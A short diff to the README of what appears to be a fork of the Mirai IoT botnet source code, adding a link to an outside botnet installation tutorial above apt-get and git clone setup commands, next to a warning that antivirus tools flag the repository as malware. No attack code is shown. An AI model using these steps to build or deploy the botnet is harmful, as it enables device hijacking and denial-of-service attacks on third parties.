@@ -21,6 +21,10 @@ responsibility.
 The [zip file](https://www.virustotal.com/en/file/f10667215040e87dae62dd48a5405b3b1b0fe7dbbfbf790d5300f3cd54893333/analysis/1477822491/) for this repo is being identified by some AV programs as malware.  Please take caution. 
 
 ## Install
+
+※If you are unable to install the software, please refer to the following URL for installation.
+https://github.com/ruCyberPoison/-Mirai-Iot-BotNet/blob/master/TUTORIAL.txt
+
 ```
 # apt-get install git gcc golang electric-fence mysql-server mysql-client
 # git clone https://github.com/ware255/Mirai-Source-Code-plus.git
